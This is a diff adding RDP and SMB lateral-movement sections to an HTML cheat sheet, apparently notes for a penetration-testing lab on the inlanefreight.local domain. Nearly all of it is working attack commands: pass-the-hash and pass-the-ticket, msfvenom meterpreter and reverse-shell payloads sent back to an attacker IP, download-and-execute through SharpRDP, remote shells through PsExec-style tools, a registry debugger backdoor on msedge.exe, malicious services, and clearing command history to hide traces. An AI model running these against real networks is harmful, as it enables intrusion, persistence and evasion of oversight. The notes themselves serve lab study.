@@ -500,6 +500,39 @@
   
 </li>
       
+        <li class="md-nav__item">
+  <a href="#rdp" class="md-nav__link">
+    <span class="md-ellipsis">
+      RDP
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="RDP">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#sharprdp" class="md-nav__link">
+    <span class="md-ellipsis">
+      SharpRDP
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#server-message-block-smb" class="md-nav__link">
+    <span class="md-ellipsis">
+      Server Message Block (SMB)
+    </span>
+  </a>
+  
+</li>
+      
     </ul>
   
 </nav>
@@ -521,6 +554,27 @@
   
   <span class="md-ellipsis">
     Privilege Escalation
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../crtp/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    CRTP
   </span>
   
 
@@ -1263,6 +1317,39 @@
   
 </li>
       
+        <li class="md-nav__item">
+  <a href="#rdp" class="md-nav__link">
+    <span class="md-ellipsis">
+      RDP
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="RDP">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#sharprdp" class="md-nav__link">
+    <span class="md-ellipsis">
+      SharpRDP
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#server-message-block-smb" class="md-nav__link">
+    <span class="md-ellipsis">
+      Server Message Block (SMB)
+    </span>
+  </a>
+  
+</li>
+      
     </ul>
   
 </nav>
@@ -1299,6 +1386,81 @@
 <li>One trick we can use here is registering a new session configuration using the Register-PSSessionConfiguration cmdlet: <code>Register-PSSessionConfiguration -Name backupadmsess -RunAsCredential inlanefreight\backupadm</code></li>
 <li>Restart the WinRM service by typing <code>Restart-Service WinRM</code> in current PSSession.</li>
 <li>Check again with <code>klist</code> and the double hop problem has been eliminated.</li>
+</ol>
+<h2 id="rdp"><strong>RDP</strong></h2>
+<ol>
+<li>RDP Enumeration: <code>netexec rdp 10.129.229.0/24 -u helen -p 'RedRiot88' -d inlanefreight.local</code></li>
+<li>Optimizing xfreerdp for Low Latency Networks or Proxy Connections: <code>xfreerdp /u:Helen /p:'RedRiot88' /d:inlanefreight.local /v:10.129.229.244 /dynamic-resolution /drive:.,linux /bpp:8 /compression -themes -wallpaper /clipboard /audio-mode:0 /auto-reconnect -glyph-cache</code></li>
+<li>Confirm if Restricted Admin Mode is enabled: <code>reg query HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin</code></li>
+<li>o enable Restricted Admin Mode, we would set the DisableRestrictedAdmin value to 0: <code>reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /d 0 /t REG_DWORD</code></li>
+<li>To perform Pass the Hash from a Linux machine, we can use xfreerdp with the /pth option to use a hash and connect to RDP: <code>proxychains4 -q xfreerdp /u:helen /pth:62EBA30320E250ECA185AA1327E78AEB /d:inlanefreight.local /v:172.20.0.52</code></li>
+<li>For Pass the Ticket we can use Rubeus:<ol>
+<li><code>.\Rubeus.exe createnetonly /program:powershell.exe /show</code></li>
+<li><code>.\Rubeus.exe asktgt /user:helen /rc4:62EBA30320E250ECA185AA1327E78AEB /domain:inlanefreight.local /ptt</code></li>
+<li>From the window where we imported the ticket, we can use the mstsc /restrictedAdmin command: <code>mstsc.exe /restrictedAdmin</code></li>
+</ol>
+</li>
+</ol>
+<h4 id="sharprdp"><strong>SharpRDP</strong></h4>
+<ol>
+<li>Execute Metasploit to listen on port 8888: <code>msfconsole -x "use multi/handler;set payload windows/x64/meterpreter/reverse_https; set LHOST 10.10.14.207; set LPORT 8888; set EXITONSESSION false; set EXITFUNC thread; run -j"</code></li>
+<li>Generate a payload with msfvenom using PowerShell Reflection: <code>msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.14.207 LPORT=8888 -f psh-reflection -o s</code></li>
+<li>Use python http server to host our payload: <code>sudo python3 -m http.server 80</code></li>
+<li>Now we can use SharpRDP to execute a powershell command to execute our payload and provide a session: <code>.\SharpRDP.exe computername=srv01 command="powershell.exe IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.207/s')" username=inlanefreight\helen password=RedRiot88</code></li>
+<li>Use <a href="https://github.com/0xthirteen/CleanRunMRU">CleanRunMRU</a> to clean all command records:<ol>
+<li>Get the tool: <code>wget -Uri http://10.10.14.207/CleanRunMRU/CleanRunMRU/Program.cs -OutFile CleanRunMRU.cs</code></li>
+<li>Use csc.exe to compile it: <code>C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe .\CleanRunMRU.cs</code></li>
+<li>Use CleanRunMRU.exe to clear all commands: <code>.\CleanRunMRU.exe  clearall</code></li>
+</ol>
+</li>
+</ol>
+<h2 id="server-message-block-smb"><strong>Server Message Block (SMB)</strong></h2>
+<ol>
+<li>SMB Enumeration: <code>proxychains4 -q nmap 172.20.0.52 -sV -sC -p139,445 -Pn</code></li>
+<li>Use PsExec to connect to a remote host and execute commands interactivelly: <code>.\PsExec.exe \\SRV02 -i -u INLANEFREIGHT\helen -p RedRiot88 cmd</code></li>
+<li>To execute our payload as NT AUTHORITY\SYSTEM, we need to specify the option -s which means that it will run with SYSTEM privileges: <code>.\PsExec.exe \\SRV02 -i -s -u INLANEFREIGHT\helen -p RedRiot88 cmd</code></li>
+<li>Perform lateral movement with SharpNoPSExec:<ol>
+<li>Start listening with Netcat: <code>nc -lnvp 8080</code></li>
+<li>Generate the reverse shell payload using https://www.revshells.com or our fother C2.</li>
+<li>Run SharpNoPSExec<code>.\SharpNoPSExec.exe --target=172.20.0.52 --payload="c:\windows\system32\cmd.exe /c powershell -exec bypass -nop -e ...SNIP...AbwBzAGUAKAApAA=="</code></li>
+</ol>
+</li>
+<li>Nimexec works simillary to SharpNoPSExec:<ol>
+<li>Start listening with Netcat: <code>nc -lnvp 8080</code></li>
+<li>Generate the reverse shell payload using revshells.com, and to convert the plain text password to NTLM hash, we can use this recipe in CyberChef: <code>.\NimExec -u helen -d inlanefreight.local -p RedRiot88 -t 172.20.0.52 -c "cmd.exe /c powershell -e JABjAGwAaQBlAG...SNIP...AbwBzAGUAKAApAA==" -v</code></li>
+</ol>
+</li>
+<li>Reg.exe: <ol>
+<li>Set up an SMB server to host our payload: <code>sudo python3 smbserver.py share -smb2support /home/plaintext/nc.exe</code></li>
+<li>Execute our Netcat listener: <code>nc -lnvp 8080</code></li>
+<li>Execute reg.exe to add a new registry key to Microsoft Edge (msedge.exe): <code>reg.exe add "\\srv02.inlanefreight.local\HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\msedge.exe" /v Debugger /t reg_sz /d "cmd /c copy \\172.20.0.99\share\nc.exe &amp;&amp; nc.exe -e \windows\system32\cmd.exe 172.20.0.99 8080"</code></li>
+<li>Once Microsoft Edge is opened by any user in the domain, we will instantly get a reverse shell.</li>
+<li>It is important to keep in mind that to use SMB share folder without authentication we need to have the following registry key set to 1: <code>reg.exe query HKLM\SYSTEM\CurrentControlSet\Services\LanmanWorkstation\Parameters /v AllowInsecureGuestAuth</code></li>
+<li>If have an account with administrative rights, we can use the following command to allow insecure guest authentication: <code>reg.exe add HKLM\SYSTEM\CurrentControlSet\Services\LanmanWorkstation\Parameters /v AllowInsecureGuestAuth /d 1 /t REG_DWORD /f</code></li>
+</ol>
+</li>
+<li>Use psexec.py to get remote code execution on a target host, administrator login credentials are required: <code>proxychains4 -q psexec.py INLANEFREIGHT/helen:'RedRiot88'@172.20.0.52</code></li>
+<li>The smbexec.py method leverages the built-in Windows SMB functionality to run arbitrary commands on a remote system without uploading files, making it a quieter alternative: <code>proxychains4 -q smbexec.py INLANEFREIGHT/helen:'RedRiot88'@172.20.0.52</code></li>
+<li>The services.py script in Impacket interacts with Windows services using the MSRPC interface: <code>proxychains4 -q services.py INLANEFREIGHT/helen:'RedRiot88'@172.20.0.52 list</code><ol>
+<li>Use the Metasploit output option exe-service, which creates a service binary: <code>msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.207 LPORT=9001 -f exe-service -o rshell-9001s.exe</code></li>
+<li>Execute the command to create a new service: <code>proxychains4 -q services.py INLANEFREIGHT/helen:'RedRiot88'@172.20.0.52 create -name 'Service Backdoor' -display 'Service Backdoor' -path "\\\\10.10.14.207\\share\\rshell-9001.exe"</code></li>
+<li>Ensure that the SMB server has the file that will be executed: <code>sudo smbserver.py share -smb2support ./</code></li>
+<li>Run our Netcat listener: <code>nc -lnvp 8080</code></li>
+<li>View the configuration of the custom command created using config -name <serviceName>: <code>proxychains4 -q services.py INLANEFREIGHT/helen:'RedRiot88'@172.20.0.52 config -name 'Service Backdoor'</code></li>
+<li>Cover up the traces and delete the service by typing delete -name <serviceName>: <code>proxychains4 -q services.py INLANEFREIGHT/helen:'RedRiot88'@172.20.0.52 delete -name 'Service Backdoor'</code></li>
+<li>Alternatively, we use services.py to modify existing services: <ol>
+<li><code>proxychains4 -q impacket-services INLANEFREIGHT/helen:'RedRiot88'@172.20.0.52 config -name Spooler</code></li>
+<li>Modify the binary path to our payload and set the START_TYPE to AUTO START with the option -start_type 2: <code>proxychains4 -q impacket-services INLANEFREIGHT/helen:'RedRiot88'@172.20.0.52 change -name Spooler -path "\\\\10.10.14.207\\share\\rshell-9001.exe" -start_type 2</code></li>
+<li>Start the service and wait for our command execution: <code>proxychains4 -q impacket-services INLANEFREIGHT/helen:'RedRiot88'@172.20.0.52 start -name Spooler</code></li>
+</ol>
+</li>
+</ol>
+</li>
+<li>The atexec.py script utilizes the Windows Task Scheduler service, which is accessible through the atsvc SMB pipe:<ol>
+<li>Start a Netcat listener: <code>nc -lnvp 8080</code></li>
+<li>Pass the domain name, administrator user, password, and target IP address <domain>/<user>:<password>@<ip>, and lastly, we can pass our reverse shell payload to get executed. We can generate the reverse shell payload using revshells.com: <code>proxychains4 -q atexec.py INLANEFREIGHT/helen:'RedRiot88'@172.20.0.52 "powershell -e ...SNIP...AbwBzAGUAKAApAA=="</code></li>
+</ol>
+</li>
 </ol>
 
 
